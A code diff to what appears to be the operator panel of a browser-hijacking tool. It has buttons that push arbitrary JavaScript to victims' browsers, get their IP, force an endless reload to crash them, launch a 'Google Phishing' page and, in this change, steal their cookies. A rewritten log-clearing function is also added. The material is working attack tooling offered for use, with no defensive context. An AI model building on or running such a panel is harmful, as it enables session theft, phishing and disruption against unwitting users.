@@ -36,12 +36,14 @@ fieldset{
 <button onclick="displayJS(document.querySelector('#displayJS').value)">Execute JS</button><br>
 <button onclick="displayJS('getIP();')">Get IP</button><br>
 <button onclick="displayJS('window.location.reload();')">Reload user</button><br>
-<button onclick="crash()">Brute force crash</button><br>  
+<button onclick="crash()">Brute force crash</button><br>
+  <button onclick="getCookies()">Get cookies 🍪</button><br>
+  
 <button onclick="phish()">Google Phishing</button><br>
 
 <button id="detailbtn" onclick="show()">Show details</button><br>
 <button onclick="download()">Download logs</button><br>
-<button onclick="clear()">Clear logs</button><br>
+<button onclick="clearLogs()">Clear logs</button><br>
 </div>
 <div id="details" style="display: none;"></div>
 <div id="logs">
@@ -104,6 +106,10 @@ console.log(value);
   function crash(){
     displayJS("while(true){window.location.reload();}");
   }
+  function getCookies(){
+    displayJS("getCookies();");
+  }
+
 var logs;
 var script1 = "";
 var script2 = "";
@@ -194,8 +200,15 @@ function hide(){
   downloadLink.click();
 }
 
-function clear(){
-window.open("clearLogs.php");
+function clearLogs(){
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+      if (this.readyState == 4 && this.status == 200) {
+  appendLog("Request sent to phish...");
+      }
+    };
+    xhttp.open("GET", "clearLogs.php", true);
+    xhttp.send();
 }
 
   function wrongPassword(){
